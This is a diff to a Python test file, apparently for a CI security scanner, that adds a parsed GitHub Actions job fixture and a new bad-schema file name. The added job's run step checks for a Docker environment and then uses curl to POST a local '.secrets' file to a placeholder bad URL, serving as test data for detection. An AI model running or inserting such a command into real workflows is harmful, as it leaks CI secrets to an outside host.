@@ -60,14 +60,26 @@ def definition():
                 "__startline__": 24,
                 "__endline__": 30
             },
+            "no_step_name_job": {
+                "runs-on": "ubuntu-latest",
+                "steps": [
+                    {
+                        "run": "(ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\ncurl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
+                        "__startline__": 31,
+                        "__endline__": 35
+                    }
+                ],
+                "__startline__": 24,
+                "__endline__": 35
+            },
             "__startline__": 6,
-            "__endline__": 30
+            "__endline__": 35
         },
         "__startline__": 1,
-        "__endline__": 30
+        "__endline__": 35
     }
 
 
 @pytest.fixture()
 def bad_schema_files():
-    return {'bad_format.yaml', 'empty_jobs.yaml'}
+    return {'bad_format.yaml', 'empty_jobs.yaml', 'nested_jobs.yaml'}
